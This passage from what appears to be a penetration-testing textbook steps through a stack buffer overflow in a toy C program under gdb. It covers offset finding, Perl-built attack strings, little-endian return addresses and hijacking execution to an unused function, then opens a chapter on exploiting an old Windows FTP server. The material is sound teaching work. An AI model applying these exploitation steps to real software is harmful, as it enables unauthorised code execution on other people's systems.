Let’s note one thing at the second breakpoint in Listing 16-10 before we
move on to the really interesting part.
Breakpoint 2, function (str=0xbffff735 'A' )
at overflowtest.c:10
10 strcpy(buffer, str);
(gdb) x/16xw $esp
0xbffff500: 0xb7f93849 0x08049ff4 0xbffff518 0x080482e8
0xbffff510: 0xb7fcfff4 0x08049ff4 0xbffff528 0x08048443u
0xbffff520: 0xbffff735 0xbffff540 0xbffff598 0xb7e8c685
0xbffff530: 0x08048470 0x08048340 0xbffff598 0xb7e8c685
(gdb) x/1xw $ebp
0xbffff518: 0xbffff528
372 Chapter 16
(gdb) continue
Continuing.
Listing 16-10: Examining memory at breakpoint 2
You can see here that function1’s stack frame has also moved up 32 bytes.
Also note that our return address still holds the memory address 0x08048443 u.
Though our stack frame has moved around a bit, the instructions in mem-
ory to be executed are in the same place.
Use the continue command again to move on to the third breakpoint.
This is where things get interesting, as shown in Listing 16-11.
Breakpoint 3, function (str=0x41414141 )
at overflowtest.c:11
11 }
(gdb) x/16xw $esp
0xbffff500: 0xbffff513 0xbffff733 0xbffff518 0x080482e8
0xbffff510: 0x41fcfff4 0x41414141 0x41414141 0x41414141
0xbffff520: 0x41414141 0x41414141 0x41414141 0x41414141
0xbffff530: 0x08040041 0x08048340 0xbffff598 0xb7e8c685
(gdb) continue
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)
Listing 16-11: Return address overwritten by As
Let’s examine the memory again at our third breakpoint, directly after
strcpy but before function1 returns to main. This time, not only is the return
address overwritten by As at u but part of main’s stack frame is overwritten
as well. At this point, there is no hope for the program to recover.
When function1 returns, the program attempts to execute the instruc-
tions at the return address for main, but the return address has been over-
written with our As, causing the expected segmentation fault when trying
to execute the instruction at the memory address 41414141. (In the coming
sections, we’ll discuss replacing the return address with something that
redirects the program to code of our own instead of crashing it.)
Controlling EIP
Making the program crash is interesting in and of itself, but as exploit
developers, our goal is to hijack execution if possible and get the target
CPU to execute code on our behalf. Perhaps by manipulating the crash, we
can execute other instructions that the developer never intended.
Currently, our program crashes when it tries to execute the instructions
at the memory address 41414141, which is out of bounds. We need to change
our argument string to include a valid memory address that our program
can access. If we can replace the return address with another valid memory
location, we should be able to hijack execution when function1 returns.
A Stack-Based Buffer Overflow in Linux 373
Perhaps the developer even left some debugging code in the program that we
can use to illustrate this purpose. (But I’m getting a bit ahead of myself here.)
To redirect execution, we first need to determine where the return
address is overwritten by our long string of As. Let’s look back at what our
stack looked like when we ran our program normally with only four charac-
ters for our argument, as shown here.
0xbffff520: 0xbffff533 0xbffff74c 0xbffff538 0x080482e8
0xbffff530: 0x41fcfff4 0x00414141u 0xbffff500v 0x08048443w
We can see where the four As u were copied into the local variable,
buffer. Now, recall that the four bytes directly after EBP v contain the return
address 0x08048443 w. We can see that after the four As, there are five more
bytes in function1’s stack frame, which come before the return address.
Looking at memory, it stands to reason that if we give our program an
argument that is 5 + 4 + 4 bytes long, the last four bytes will overwrite the
return address. We can test this by sending our program an argument of
nine As followed by four Bs. If our program crashes when trying to execute
the instruction at memory address 42424242 (the hexadecimal representa-
tion of B), we’ll know we have calculated our offset correctly.
We can use Perl again to help us create our argument string, as shown in
Listing 16-12.
(gdb) delete 1
(gdb) delete 2
(gdb) run $(perl -e 'print "A" x 9 . "B" x 4')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/georgia/overflowtest $(perl -e 'print "A" x 9 . "B" x 4')
Listing 16-12: Starting the program with a new attack string
Before we run the program with this new argument, delete the first two
breakpoints because the state of memory won’t change in an interesting way
until our third breakpoint, after strcpy is executed.
Start the program using Perl, with nine As followed by four Bs as the
attack string. Because the program crashed on its last run, you will be
asked if you would like to start from the beginning. Enter y for yes. When
we examine memory at our only remaining breakpoint, everything looks
as predicted, as shown in Listing 16-13.
Breakpoint 3, function (str=0xbffff700 "\017") at overflowtest.c:11
11 }
(gdb) x/20xw $esp
0xbffff510: 0xbffff523 0xbffff744 0xbffff528 0x080482e8
0xbffff520: 0x41fcfff4 0x41414141 0x41414141 0x42424242u
0xbffff530: 0xbffff700 0xbffff550 0xbffff5a8 0xb7e8c685
0xbffff540: 0x08048470 0x08048340 0xbffff5a8 0xb7e8c685
0xbffff550: 0x00000002 0xbffff5d4 0xbffff5e0 0xb7fe2b38
(gdb) continue
374 Chapter 16
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb)
Listing 16-13: Overwriting the return address with Bs
Where we previously saw our return address (0x08048443), we now have
0x42424242. If we let the program continue, we can see that it crashes while
trying to execute the memory address of four Bs u. This is once again out
of bounds, but at least now we know where to place the address of the code
we want to execute.
We have now pinpointed which four bytes in our attack string overwrite
the return address. Remember that the return address is loaded into EIP
when function1 returns. Now we just need to find somewhere more interest-
ing to send execution than 41414141 or 42424242.
Hijacking Execution
We’ve determined where to overwrite the return address in our argument
string, but we still need something to put there. (This example may seem
a bit contrived compared to the rest of the exploit development examples
we’ll cover, but it illustrates the underlying concepts well.) We’ve managed to
manipulate an issue with the strcpy function used by the program to break
out of the buffer variable and overwrite additional memory addresses,
including the return address.
Looking back at our source code for overflowtest.c, recall the program
contains another function in addition to main and function1. The first function
in the program, called overflowed, prints “Execution Hijacked” out to the con-
sole and then returns. This extra function is never called when the program
runs normally, but as its output implies, we can use it to hijack execution.
Returning to our debugger, if we can find the start of overflowed in mem-
ory, we should be able to replace our four Bs with that memory address, over-
write the return address, and force the program to execute instructions the
developers didn’t intend it to. We have the source code and know the function
name we are looking for, so this task is trivial. Let’s just disassemble overflowed
and find out where it is loaded in memory, as shown in Listing 16-14.
(gdb) disass overflowed
Dump of assembler code for function overflowed:
u 0x080483f4 : push %ebp
0x080483f5 : mov %esp,%ebp
0x080483f7 : sub $0x8,%esp
0x080483fa : movl $0x8048520,(%esp)
0x08048401 : call 0x804832c 
0x08048406 : leave
0x08048407 : ret
End of assembler dump.
(gdb)
Listing 16-14: Disassembling overflowed
A Stack-Based Buffer Overflow in Linux 375
As you can see, the memory address 0x80483f4 u holds the first instruc-
tion of overflowed. If we redirect our program here, it will execute all the
instructions in that function.
note This won’t give us a reverse shell or join the target to a botnet; it will only print out
“Execution Hijacked” to the screen. We will look at more exciting execution hijacks in
the exploit development examples in the next three chapters.
We can use Perl to help us create our argument string, which will
include hexadecimal bytes for the memory address we want to use to over-
write the return address, as shown here.
(gdb) run $(perl -e 'print "A" x 9 . "\x08\x04\x83\xf4"')
Starting program: /home/georgia/overflowtest $(perl -e 'print "A" x 9 . "\x08\x04\x83\xf4"')
This time, we replace our four Bs with \x08\x04\x83\xf4, which should
redirect execution to the beginning of overflowed. But things don’t work out
as planned, as shown in Listing 16-15.
Breakpoint 3, function (str=0xbffff700 "\017") at overflowtest.c:11
11 }
(gdb) x/16xw $esp
0xbffff510: 0xbffff523 0xbffff744 0xbffff528 0x080482e8
0xbffff520: 0x41fcfff4 0x41414141 0x41414141 0xf4830408u
0xbffff530: 0xbffff700 0xbffff550 0xbffff5a8 0xb7e8c685
0xbffff540: 0x08048470 0x08048340 0xbffff5a8 0xb7e8c685
(gdb) continue
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0xf4830408 in ?? ()
Listing 16-15: The return address bytes are flipped.
As you can see, we hit our breakpoint as expected, but when we exam-
ine memory, we seem to have a little problem. The memory address of the
first instruction in overflowed is 0x80483f4, but the return address on our stack
is 0xf4830408 u. The digits aren’t entirely reversed, but the bytes are in the
wrong order.
Recall that two hexadecimal digits make up one byte. When we let the
program continue, we receive another access violation for trying to execute
data at 0xf4830408. We know that the program crashes because the new
return address is wrong, so let’s look at how those bytes wound up out of
order in the first place so we can fix the problem.
Endianness
When I was first learning basic exploit development, I spent many hours
scratching my head and wondering what could possibly be keeping my exploit
from working. I had run into this same problem, and unfortunately, I hadn’t
been paying attention in operating systems class when we covered endianness.
376 Chapter 16
In the 1726 novel Gulliver’s Travels, Jonathan Swift’s titular character
is shipwrecked on the island of Lilliput. Lilliput is currently on bad terms
with neighboring Blefuscu because of a dispute about how to properly crack
an egg. In Lilliput, eggs are cracked at the little end, and in Blefuscu, eggs
are cracked at the big end. We have a similar dispute in computer science
regarding byte order. Big endians believe that the most significant byte
should be stored first, whereas little endians store the least significant byte
first. Our Ubuntu virtual machine has an Intel architecture, which is little
endian. To account for little-endian architecture, we need to flip the bytes
of our memory address around, as shown here.
(gdb) run $(perl -e 'print "A" x 9 . "\xf4\x83\x04\x08"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/georgia/overflowtest $(perl -e 'print "A" x 9 . "\xf4\x83\x04\x08"')
Using the return address \xf4\x83\x04\x08 with the byte order flipped
for our Intel architecture fixes our problem, as shown in Listing 16-16.
Breakpoint 3, function (str=0xbffff700 "\017") at overflowtest.c:11
11 }
(gdb) x/16xw $esp
0xbffff510: 0xbffff523 0xbffff744 0xbffff528 0x080482e8
0xbffff520: 0x41fcfff4 0x41414141 0x41414141 0x080483f4
0xbffff530: 0xbffff700 0xbffff550 0xbffff5a8 0xb7e8c685
0xbffff540: 0x08048470 0x08048340 0xbffff5a8 0xb7e8c685
(gdb) continue
Continuing.
Execution Hijacked u
Program received signal SIGSEGV, Segmentation fault.
0xbffff700 in ?? ()
(gdb)
Listing 16-16: Successfully hijacking execution
This time when we hit the breakpoint, our return address looks correct.
Sure enough, when we let the program continue, “Execution Hijacked” is
printed to the console at u, meaning we have successfully hijacked execu-
tion and exploited a buffer overflow vulnerability.
To see the results outside the debugger, we run overflowtest from the
command line with an argument that includes the new return address, as
shown here.
georgia@ubuntu:~$ ./overflowtest $(perl -e 'print "A" x 9 . "\xf4\x83\x04\x08"')
Execution Hijacked
Segmentation fault
A Stack-Based Buffer Overflow in Linux 377
Note that after overflowed returns, the program crashes with a segmen-
tation fault when executing the memory address bffff700. This address is
the same as the next four bytes on the stack after our return address. And
thinking back to how memory works, this makes sense, but our “malicious”
code was fully executed prior to the crash. After the stack frame for overflowed
is popped off the stack, bffff700 appears to be in the place of the return
address. We sent execution straight to overflowed without normal function-
calling things like saving a return address. When overflowed’s stack frame is
unwound from the stack, the next memory address of the stack is assumed
to be the return address, but this is just part of main’s stack frame, so we crash.
How might you augment your attack string to fix this? You guessed it:
You could add another four bytes to our attack string, sending execution
back to the original return address in main. Because we have corrupted
main’s stack frame, we may still run into trouble down the line, but we can
meet our goal of tricking the program into executing code on our behalf.
summary
In this chapter we looked at a simple C program with a buffer overflow
vulnerability (namely the use of the insecure strcpy function) that does not
check its array boundaries, which allows us to write to adjacent memory. We
exploited this issue by writing a longer string to the command line than the
program expected. We hijacked the program’s execution by overwriting a
function’s return address with our own value. We sent execution to another
function included in the original program.
Now that you’ve seen a basic example of a stack-based overflow, let’s
move on to something a bit more complex. In the next chapter, our example
will focus on a Windows-based target and a real-world target program.
378 Chapter 16
17
a staCk-BaseD Buffer
oVerflow in winDows
In this chapter, we will look at exploiting a stack-based
buffer overflow in an older version of a Windows-based
FTP server. As we did in Chapter 16, we will attempt
to overwrite the return pointer saved onto the stack
when a function is called, as shown earlier in Figure 16-3 on page 364.
When the function main calls function1, the next instruction to be executed is
saved on the stack, and a stack frame for function1 is added to the stack.
The size of function1’s local variables is determined when the applica-
tion is compiled and fixed. The amount of space “reserved” on the stack for
these local variables is fixed, too. This reservation is called a stack buffer. If we
put more data in the stack buffer than it can hold, we will cause the buffer
to overflow. Then we may be able to overwrite the saved return address,
which is placed after the stack buffer, and take control of program execu-
tion. (For a more detailed review of this process, see Chapter 16.)
In Chapter 1, we installed War-FTP version 1.65 on the Windows XP tar-
get, but we didn’t start it. We have exploited the FileZilla FTP server in previ-
ous chapters, and if you’ve been following along, that FTP server is still
running. Before we can use War-FTP, we need to stop
the FileZilla FTP server using the XAMPP control panel.
This will open TCP port 21 for War-FTP. Open War-
FTP on the Windows XP desktop by double clicking
its icon (see Figure 17-1), and click the lightning bolt